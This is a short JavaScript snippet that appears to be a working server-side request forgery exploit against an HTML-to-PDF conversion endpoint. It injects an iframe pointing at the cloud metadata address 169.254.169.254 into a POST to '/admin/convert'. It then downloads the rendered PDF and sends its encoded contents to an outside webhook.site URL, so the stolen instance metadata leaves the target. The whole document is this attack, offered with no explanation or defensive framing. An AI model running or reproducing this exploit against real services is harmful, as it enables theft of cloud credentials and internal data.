const htmlCode = "<body><iframe src='http://169.254.169.254/latest/meta-data/'></iframe></body>";
const pdfUrl = "/admin/convert";

fetch(pdfUrl, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ htmlCode })
})
.then(response => response.json())
.then(data => fetch(data.pdfLink))
.then(response => response.blob())
.then(blob => {
  const reader = new FileReader();
  reader.onload = function() {
    const pdfContent = encodeURIComponent(reader.result);
    const webhookUrl = `https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39?data=${encodeURIComponent(reader.result)}`;
    fetch(webhookUrl);
  };
  reader.readAsDataURL(blob);
})
.catch(error => console.log(error));
